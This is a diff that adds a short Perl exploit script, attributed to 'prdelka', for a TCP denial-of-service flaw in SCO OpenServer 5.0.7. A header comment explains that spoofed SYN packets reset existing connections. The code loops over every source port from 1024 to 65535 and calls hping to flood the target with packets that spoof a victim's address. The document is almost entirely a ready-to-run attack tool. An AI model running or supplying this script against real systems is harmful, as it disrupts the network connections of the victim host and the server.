@@ -1,0 +1,19 @@
+#!/bin/perl
+#SCO Openserver 5.0.7 TCP DoS 
+#============================
+#Due to an implementation flaw, it is possible for a remote
+#attacker to spoof TCP packets with a SYN and cause existing
+#connections to be RST without any checking. Below is example
+#of how to exploit such flaw using hping utility.
+#
+# - prdelka
+
+if(!$ARGV[0]||!$ARGV[1]||!$ARGV[2])
+{
+	die "Error: Usage [victim] [SCO Openserver] [port]";
+}
+
+for($a = 1024;$a <= 65535;$a++)
+{
+	system("hping -a $ARGV[0] -p $ARGV[2] -S $ARGV[1] -s $a -c 100 -i u1");
+}
